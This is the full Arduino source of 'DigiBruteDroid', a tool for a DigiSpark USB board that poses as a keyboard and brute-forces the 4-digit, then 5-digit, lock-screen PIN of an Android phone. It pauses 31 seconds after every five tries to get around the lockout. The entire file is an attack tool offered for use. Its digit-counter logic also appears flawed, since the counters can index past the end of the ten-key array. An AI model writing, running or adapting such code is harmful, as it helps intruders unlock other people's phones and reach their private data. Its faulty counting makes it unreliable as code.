/*===============================================
DigiBruteDroid - A 4-Digit PIN Brute Force attack 
for USB-OTG Android devices. 
Written to support DigiStump's DigiSpark Model A.
Written by Seattleandrew
===============================================*/

#include "DigiKeyboard.h"
int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
int a = 0; //1st digit
int b = 0; //2nd digit
int c = 0; //3rd digit
int d = 0; //4th digit
int e = 0; //5th digit
int count = 0;
bool key_stroke_e = false;

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0); //this is generally not necessary but with some older systems it seems to prevent missing the first character after a delay
  delay(3000);
}

void loop() {
  //After 5 attempts, initialize 31000 ms wait to retry.
  if(count == 5){
    digitalWrite(1,HIGH); //Change this to 0 if using DigiSpark model B
    DigiKeyboard.sendKeyStroke(40); //we hit enter to make the popup go away
    delay(31000);
    count = 0;
    digitalWrite(1,LOW);
  }
  /*Sends keystrokes based upon the values between 0-9 
  It will start bruting 5 digits if a exceeds 10*/
  if (key_stroke_e == false){
    DigiKeyboard.sendKeyStroke(num[a]);
    DigiKeyboard.sendKeyStroke(num[b]);
    DigiKeyboard.sendKeyStroke(num[c]);
    DigiKeyboard.sendKeyStroke(num[d]);
  }
  //check for whether it is true. If so, use 5 digits instead.
  if (key_stroke_e == true){
    DigiKeyboard.sendKeyStroke(num[a]);
    DigiKeyboard.sendKeyStroke(num[b]);
    DigiKeyboard.sendKeyStroke(num[c]);
    DigiKeyboard.sendKeyStroke(num[d]);
    DigiKeyboard.sendKeyStroke(num[e]);
  }
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
  count++;
  //Dimish the amount of lines by using ternary operators
  d = (d==10) ? 0 : (d + 1);
  if (d==10){
    c = (c==10) ? 0 : (c + 1);
    if (c==10){
  	  b = (b==10) ? 0 : (b + 1);
  	  if (b==10){
  		  a = (a==10) ? 0 : (a + 1);
  		  if (a==10){
  			  e = (e==10 && key_stroke_e == true) ? 0 : (e + 1);
  		  }
  	  }
    }
  }
}
